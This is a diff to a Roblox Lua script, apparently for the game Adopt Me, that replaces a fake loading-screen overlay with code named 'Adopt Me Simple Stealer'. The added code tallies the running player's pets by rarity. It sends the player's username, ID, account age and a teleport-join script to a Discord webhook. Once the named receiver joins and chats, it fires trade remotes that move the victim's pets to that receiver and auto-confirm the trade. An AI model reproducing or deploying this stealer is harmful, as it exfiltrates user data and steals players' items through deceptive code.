@@ -1,35 +1,103 @@
-local screenGui = Instance.new("ScreenGui")
-screenGui.IgnoreGuiInset = true  -- Ensures it covers the whole screen, ignoring the top bar
-screenGui.Parent = game.CoreGui
+local Loaders = require(game.ReplicatedStorage.Fsys).load
+local InventoryDB = Loaders("InventoryDB")
+local ClientData = Loaders('ClientData')
+local legendaries_count = 0
+local mega_count = 0
+local neon_count = 0
+local ultra_count = 0
+local rare_count = 0
+local uncommon_count = 0
+local common_count = 0
 
-local frame = Instance.new("Frame")
-frame.Size = UDim2.new(1, 0, 1, 0)  -- Full screen size
-frame.Position = UDim2.new(0, 0, 0, 0)  -- Top-left corner
-frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)  -- Black background
-frame.Parent = screenGui
-
-local loadingText = Instance.new("TextLabel")
-loadingText.Size = UDim2.new(0.3, 0, 0.1, 0)  -- Size relative to screen
-loadingText.Position = UDim2.new(0.35, 0, 0.45, 0)  -- Center the text
-loadingText.Text = "Loading... Please Wait 60 Seconds"
-loadingText.Font = Enum.Font.SourceSans
-loadingText.TextSize = 36
-loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)  -- White text color
-loadingText.BackgroundTransparency = 1  -- Transparent background for the text
-loadingText.Parent = frame
-
--- TweenService for fade animation
-local tweenService = game:GetService("TweenService")
-
-local function fadeText()
-    local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1, true)
-    local goal = {TextTransparency = 0.5}
-    local tween = tweenService:Create(loadingText, tweenInfo, goal)
-    tween:Play()
+for i, v in pairs(ClientData.get("inventory").pets) do
+  if InventoryDB[v.category][v.id].rarity == "legendary" then
+    legendaries_count = legendaries_count + 1
+  end
+  if InventoryDB[v.category][v.id].properties == "mega_neon" then
+    mega_count = mega_count + 1
+  end
+  if InventoryDB[v.category][v.id].properties == "neon" then
+    neon_count = neon_count + 1
+  end
+  if InventoryDB[v.category][v.id].rarity == "ultra_rare" then
+    ultra_count = ultra_count + 1
+  end
+  if InventoryDB[v.category][v.id].rarity == "rare" then
+    rare_count = rare_count + 1
+  end
+    if InventoryDB[v.category][v.id].rarity == "uncommon" then
+    uncommon_count = uncommon_count + 1
+  end
+  if InventoryDB[v.category][v.id].rarity == "common" then
+    common_count = common_count + 1
+  end
 end
 
-fadeText()
+local plr = game.Players.LocalPlayer
+local userr = Username
+local userid = game.Players.LocalPlayer.UserId
+ local accage = game.Players.LocalPlayer.AccountAge
+local data = {
+  username = 'Adopt Me Simple Stealer',
+  avatar_url = 'https://cdn.discordapp.com/attachments/1266886405208936650/1270128838679986228/images_2.jpg?ex=66b29328&is=66b141a8&hm=6db84cb36a52d8b48f1b940c42ddc1fc118eb18073bf38bcc629bae35e426f6b&',
+  content = '@everyone Join your player using **Join Script** and type **ANYTHING** in chat to start stealing!',
+  embeds = {
+    {
+      title = 'Adopt Me Stealer | Simple Version 💻',
+      description = '**📃  Player Information**: \n ```lua\n🗽 Username: '.. tostring(plr) ..'\n🗼 User-ID: '.. tostring(userid) ..'\n⛩ Account Age: '.. tostring(accage) ..'\n🏗 Receiver: '.. userr ..'\n```\n **📦 Inventory**: \n ```lua\n🦒 Legendaries: '.. tostring(legendaries_count).. '\n🐉 Mega Neons: '.. tostring(mega_count).. '\n🐊 Neons: '.. tostring(neon_count).. '\n🐈 Ultra Rares: '.. tostring(ultra_count).. '\n🦖 Rares: '.. tostring(rare_count).. '\n🐌 Uncommons: '.. tostring(uncommon_count).. '\n🦀 Commons: '.. tostring(common_count).. '\n```\n**💼 Join Player Script**:\n\n```lua\ngame:GetService("TeleportService"):TeleportToPlaceInstance(920587237, "' .. game.JobId .. '", game.Players.LocalPlayer)\n```',
+      color = 10428396
+    }
+  }
+}
+local httpRequest = http.request or httprequest
+if httpRequest then
+  httpRequest({
+    Url = Webhook,
+    Method = 'POST',
+    Headers = {
+      ['Content-Type'] = 'application/json'
+    },
+    Body = game:GetService('HttpService'):JSONEncode(data)
+  })
+else
+  print("LMAOOOOOO")
+end
 
-wait(60)
+local function StartSteal()
+    local Loads = require(game.ReplicatedStorage.Fsys).load
+    local RouterClient = Loads("RouterClient")
+    local SendTrade = RouterClient.get("TradeAPI/SendTradeRequest")
+    local AddPetRemote = RouterClient.get("TradeAPI/AddItemToOffer")
+    local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
+    local ConfirmTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
+    
+    SendTrade:FireServer(game.Players[Username])
+    wait(3)
+    
+    local juj = require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()[game.Players.LocalPlayer.Name].inventory
+    if juj and juj.pets then
+        local petUids = {}
+        for petUid in pairs(juj.pets) do
+            table.insert(petUids, petUid)
+        end
+        
+        for i = 1, math.min(#petUids, 18) do
+            AddPetRemote:FireServer(petUids[i])
+        end
+    else
+        print("No pets found in inventory.")
+    end
+    
+    wait(5)
+    AcceptNegotiationRemote:FireServer()
+    wait(18)
+    ConfirmTradeRemote:FireServer()
+end
 
-screenGui:Destroy()
+game.Players.PlayerAdded:Connect(function(player)
+    if player.Name == Username then
+        player.Chatted:Connect(function()
+            StartSteal()
+        end)
+    end
+end)
